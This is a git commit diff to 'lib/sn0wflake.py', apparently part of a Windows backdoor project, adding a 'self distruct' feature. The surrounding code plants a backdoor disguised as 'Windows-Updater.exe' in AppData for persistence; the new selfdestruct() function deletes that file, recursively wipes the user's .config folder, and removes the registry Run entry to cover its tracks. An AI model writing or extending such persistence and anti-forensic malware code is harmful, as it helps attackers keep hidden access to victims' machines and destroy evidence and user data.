a1843db53c1791d58aea4c02a61b70197074044f
suvaa14 <suvaacharya30@gmail.com>
2025-07-09 00:23:40 +0545

    self distruct added

--- lib/sn0wflake.py
+++ lib/sn0wflake.py
@@ -3,7 +3,6 @@ import subprocess as sp
 import shutil
 import sys
 
-
 def addPersistence():
     backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
     if os.path.exists(backdoor_location):
@@ -16,3 +15,26 @@ def addPersistence():
         return "enabled"
     except Exception as e:
         return f"error: {e}"
+
+
+def getUsername():
+    try:
+        USERNAME = os.getlogin()
+    except Exception:
+        USERNAME = "None"
+    return USERNAME
+
+
+def selfdestruct():
+    try:
+        update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
+        config_location = fr'C:\Users\{getUsername()}\.config'
+        if os.path.exists(update_location):
+            os.remove(update_location)
+        if os.path.exists(config_location):
+            shutil.rmtree(config_location)
+        sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
+        return True
+
+    except Exception as e:
+        return e
